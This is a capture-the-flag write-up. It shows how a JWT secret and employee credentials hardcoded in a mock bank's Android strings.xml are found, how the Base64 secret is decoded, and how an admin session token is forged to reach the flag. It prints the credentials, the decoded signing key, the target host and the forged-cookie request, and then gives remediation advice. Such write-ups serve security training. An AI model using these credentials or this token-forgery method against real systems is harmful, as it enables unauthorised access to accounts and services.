---
title: "Ticket"
date: 2025-12-16
---

**Category:** Mobile / Web Security  
**Vulnerability:** Hardcoded Secrets & JWT Forgery

## 1\. Challenge Description

Strike Bank detected unusual activity in their customer portal. The objective is to investigate their Android application (`com.strikebank.netbanking`) using public OSINT tools, uncover hidden secrets, and use them to compromise the web portal to retrieve the flag.

> *Hint: "Everything you need is already out there\! Connect the dots..."*

## 2\. Reconnaissance (Mobile Analysis)

The challenge explicitly pointed to `bevigil.com`, a search engine for mobile applications. By searching for the package name `com.strikebank.netbanking`, we accessed the automated security report.

**Target:** `https://bevigil.com/report/com.strikebank.netbanking`

Under the **Strings** section of the report, we identified a critical file: `source/resources/res/values/strings.xml`. This file contained several sensitive configuration details that should not have been hardcoded in the application.

### Extracted Data

From the XML dump, we isolated four critical pieces of information:

| XML Key              | Value                                      |
| :------------------- | :----------------------------------------- |
| `base_url`           | `http://15.206.47.5.nip.io:8443/`          |
| `internal_username`  | `tuhin1729`                                |
| `internal_password`  | `123456`                                   |
| `encoded_jwt_secret` | `c3RyIWszYjRua0AxMDA5JXN1cDNyIXMzY3IzNw==` |

## 3\. Credential Decoding

The `encoded_jwt_secret` appeared to be Base64 encoded. Decoding it revealed the raw signing key used for session tokens.

**Command:**

```bash
echo "c3RyIWszYjRua0AxMDA5JXN1cDNyIXMzY3IzNw==" | base64 -d; echo
```

**Decoded Secret:**
`str!k3b4nk@1009%sup3r!s3cr37`

## 4\. Web Portal Access & Analysis

We navigated to the extracted `base_url` (`http://15.206.47.5.nip.io:8443/`), which presented an Employee Login portal.

Using the credentials found in the strings (`tuhin1729` / `123456`), we successfully logged in.

### Session Analysis

Upon logging in, the server set an HTTP-only cookie named `auth`. Inspecting this cookie revealed it was a **JSON Web Token (JWT)**.

**Decoded JWT Payload:**

```json
{
  "username": "tuhin1729",
  "exp": 1765017047
}
```

The user is logged in as a standard employee. The goal is likely to escalate privileges to `admin`.

## 5\. Exploitation (JWT Forgery)

Since we recovered the **JWT Signing Secret** from the Android app's `strings.xml`, we can forge a valid session token for any user.

**The Attack Path:**

1.  **Modify Payload:** Change `"username": "tuhin1729"` to `"username": "admin"`.
2.  **Sign Token:** Use the leaked secret (`str!k3b4nk@1009%sup3r!s3cr37`) to sign the new payload using the HS256 algorithm.
3.  **Inject Cookie:** Replace the browser's `auth` cookie with the forged admin token.

**Forging the Token (via jwt.io):**

  * **Header:** `{"alg": "HS256", "typ": "JWT"}`
  * **Payload:** `{"username": "admin", "exp": 1765017047}`
  * **Secret:** `str!k3b4nk@1009%sup3r!s3cr37`

**Execution:**
We sent a request to the dashboard (`/index.php`) with the forged admin cookie.

```http
GET /index.php HTTP/1.1
Host: 15.206.47.5.nip.io:8443
Cookie: auth=eyJhbGciOiJIUzI1NiIsIn...[Forged Admin Token]...
...
```

## 6\. Conclusion & Remediation

The server validated the signature using the hardcoded secret, accepted the "admin" claim, and granted access to the administrative dashboard containing the flag.

**Remediation:**

1.  **Never hardcode secrets** (API keys, encryption keys, passwords) in mobile application resources (`strings.xml`), as they are easily reverse-engineered.
2.  Use a Key Management Service (KMS) or secure backend proxy to handle signing operations.

**Flag:** `ClOuDsEk_ReSeArCH_tEaM_CTF_2025{ccf62117a030691b1ac7013fca4fb685}`
